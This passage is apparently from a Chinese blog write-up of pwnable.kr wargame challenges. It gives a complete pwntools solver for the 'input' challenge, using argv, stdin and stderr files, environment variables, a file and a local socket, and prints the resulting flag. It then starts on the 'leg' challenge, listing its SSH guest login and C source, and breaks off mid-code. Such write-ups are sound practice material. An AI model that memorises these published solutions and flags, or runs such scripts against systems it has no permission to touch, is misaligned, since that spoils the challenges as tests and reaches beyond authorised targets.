<p>试了一下直接io.sendline() 果不其然地失败了, NUL是个不好处理的玩意儿啊</p>
<p>Google得知这个地方要用著名的IO重定向, 但是C语言代码太复杂了, 还是想用Python</p>
<p>Google了一下还是找到了做法, 不过很迷为什么StringIO/BytesIO不行呢, 会提示
<code>io.UnsupportedOperation: not writable</code></p>
<p>创建临时文件总是感觉不是很干净</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;stdin.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x00\xff</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;stderr.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x02\xff</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">stdin</span>  <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;stdin.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
<span class="n">stderr</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;stderr.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./test&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span><span class="p">],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">stderr</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="第三关">第三关</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// env
</span><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 3 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>第三关要求环境变量 &ldquo;\xde\xad\xbe\xef&rdquo; 的值为 &ldquo;\xca\xfe\xba\xbe&rdquo;</p>
<p>process的env参数可以指定环境变量, 这关不难</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">env</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s1">&#39;</span>
<span class="p">}</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./test&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">33</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">stderr</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="第四关">第四关</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 4 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>第四关, 以只读模式打开 &ldquo;\x0a&rdquo; 文件, 读取四个字节, 要求是四个NUL</p>
<p>直接建个文件就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="第五关">第五关</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// network
</span><span class="c1"></span><span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
<span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
<span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">])</span> <span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;bind error, use another port</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
<span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;accept error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 5 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>一脸懵逼</p>
<p>查了下大概就是监听了argv[&lsquo;C&rsquo;] 所表示的端口,
直接用 remote 连接就可以发送数据了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;./test&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;23233&#39;</span><span class="p">,</span> <span class="o">*</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">32</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">stderr</span><span class="p">)</span>

<span class="n">net</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">23233</span><span class="p">)</span>
<span class="n">net</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">net</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>在写这关的时候, 我发现了几件比较悲剧的事情</p>
<ul>
<li>我用的是Python3</li>
<li>我在题目服务器上没有权限在当前创建文件</li>
</ul>
<p>第一点改一改 process 第一个参数的生成方式, 不要用Python3的 <code>*</code> 就行了</p>
<p>第二点可以将 CWD设 置为 /tmp/, /tmp/下我拥有创建文件的权限,
不过需要注意这样就必须将 input 路径写全 <a href="https://stackoverflow.com/questions/15725273/python-oserror-errno-2-no-such-file-or-directory">python-oserror-errno-2-no-such-file-or-directory</a></p>
<p>然而又发现虽然这样五关都过了, 但是身在/tmp/目录的 process 读不到 /homt/input2 下的flag文件&hellip;</p>
<p>试着建立了symbolic link, 但还是读不到</p>
<p>后来去吃饭电脑休眠, 回来后重连ssh的时候发现了这么一段话</p>
<blockquote>
<p>files under /tmp can be erased anytime. make your directory under /tmp</p>
</blockquote>
<p>然后在/tmp下创建新目录, 再cd进去 <code>ln -s /home/input2/flag flag</code> 可算成功了</p>
<h2 id="最终代码">最终代码</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">platform</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua&#39;</span><span class="p">):</span>
    <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="s1">&#39;MANJARO&#39;</span> <span class="ow">in</span> <span class="n">platform</span><span class="o">.</span><span class="n">platform</span><span class="p">():</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="s1">&#39;/home/zhonghua/writeup/pwnable.kr/&#39;</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="s1">&#39;/home/input2/&#39;</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">10000</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua/stdin.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x00\xff</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua/stderr.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x0a\x02\xff</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua/</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="n">stdin</span>  <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua/stdin.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
<span class="n">stderr</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/tmp/zhonghua/stderr.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>

<span class="n">env</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s1">&#39;</span><span class="p">,</span>
    <span class="s1">&#39;PWD&#39;</span><span class="p">:</span> <span class="n">pwd</span>
<span class="p">}</span>

<span class="n">arg</span> <span class="o">=</span> <span class="p">[</span><span class="n">pwd</span> <span class="o">+</span> <span class="s1">&#39;input&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x20\x0a\x0d</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">*</span> <span class="mi">32</span>

<span class="c1"># 下面的代码不兼容python2.....</span>
<span class="c1"># io = process([&#39;./test&#39;, *[&#39;a&#39;] * 64, &#39;&#39;, &#39;\x20\x0a\x0d&#39;, &#39;23233&#39;, *[&#39;a&#39;] * 32], env=env, stdin=stdin, stderr=stderr)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="s1">&#39;/tmp/zhonghua/&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">stderr</span><span class="p">)</span>

<span class="c1"># 先等它准备好...</span>
<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">net</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="n">net</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xde\xad\xbe\xef</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1"># sleep(1)</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

<span class="n">net</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><p>flag为 <code>Mommy! I learned how to pass various input in Linux :)</code></p>
<p><del>到头来其实根本没比C语言简单</del></p>
<h1 id="leg">leg</h1>
<blockquote>
<p>Daddy told me I should study arm.
But I prefer to study my leg!</p>
<p>Download : <a href="http://pwnable.kr/bin/leg.c">http://pwnable.kr/bin/leg.c</a>
Download : <a href="http://pwnable.kr/bin/leg.asm">http://pwnable.kr/bin/leg.asm</a></p>
<p>ssh <a href="mailto:leg@pwnable.kr">leg@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>看不懂看不懂, 这是什么俚语吗</p>
<p>首先放代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">key1</span><span class="p">(){</span>
    <span class="k">asm</span><span class="p">(</span><span class="s">&#34;mov r3, pc</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key2</span><span class="p">(){</span>
    <span class="k">asm</span><span class="p">(</span>
    <span class="s">&#34;push   {r6}</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;add    r6, pc, $1</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;bx r6</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;.code   16</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;mov    r3, pc</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;add    r3, $0x4</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;push   {r3}</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;pop    {pc}</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;.code  32</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="s">&#34;pop    {r6}</span><span class="se">\n</span><span class="s">&#34;</span>
    <span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">key3</span><span class="p">(){</span>
    <span class="k">asm</span><span class="p">(</span><span class="s">&#34;mov r3, lr</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Daddy has very strong arm! : &#34;</span><span class="p">);</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key1</span><span class="p">()</span><span class="o">+</span><span class="n">key2</span><span class="p">()</span><span class="o">+</span><span class="n">key3</span><span class="p">())</span> <span class="o">==</span> <span class="n">key</span> <span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Congratz!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;flag&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;I have strong leg :P</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
